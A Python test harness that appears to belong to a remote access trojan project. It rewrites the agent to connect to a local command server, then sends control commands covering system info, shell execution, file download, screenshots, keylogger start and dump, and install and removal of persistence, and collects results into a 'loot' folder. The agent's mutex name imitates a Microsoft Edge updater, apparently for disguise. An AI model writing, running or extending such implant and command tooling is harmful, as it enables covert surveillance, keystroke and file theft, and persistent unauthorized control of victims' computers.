import subprocess
import sys
import time
from pathlib import Path

BASE = Path(__file__).parent
PORT = "9443"
MAC = sys.platform == "darwin"
src = (BASE / "agent.py").read_text(encoding="utf-8")
src = (src.replace("@HOST@", "127.0.0.1").replace("@PORT@", PORT)
          .replace("@TLS@", "0").replace("@PIN@", "")
          .replace("Local\\\\MSEdgeUpdate-1b7c9e", "Local\\\\MSEdgeUpdate-smoke")
          .replace('os.path.join(APP_DIR, ".agent.lock")',
                   'os.path.join(APP_DIR, ".agent-smoke.lock")'))
(BASE / "_test_agent.py").write_text(src, encoding="utf-8")

srv = subprocess.Popen([sys.executable, "server.py", "--plain", "--port", PORT],
                       cwd=BASE, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                       stderr=subprocess.STDOUT, text=True)
time.sleep(2)
agent = subprocess.Popen([sys.executable, "_test_agent.py"], cwd=BASE)
time.sleep(4)

workdir = "/" if MAC else "C:\\Windows"
winfile = "/etc/hosts" if MAC else "C:\\Windows\\win.ini"
cmds = ["sysinfo", "exec whoami", f"cd {workdir}", "exec cd",
        f"!download {winfile}", "!screen", "!keys start", "!keys dump",
        "!sleep 1", "!persist", "!unpersist", "kill", "exit"]
for c in cmds:
    srv.stdin.write(c + "\n")
    srv.stdin.flush()
    time.sleep(2.5)

try:
    out, _ = srv.communicate(timeout=25)
except subprocess.TimeoutExpired:
    srv.kill()
    out, _ = srv.communicate()
agent.terminate()
print(out)
print("LOOT:", list((BASE / "loot").rglob("*")) if (BASE / "loot").exists() else "none")
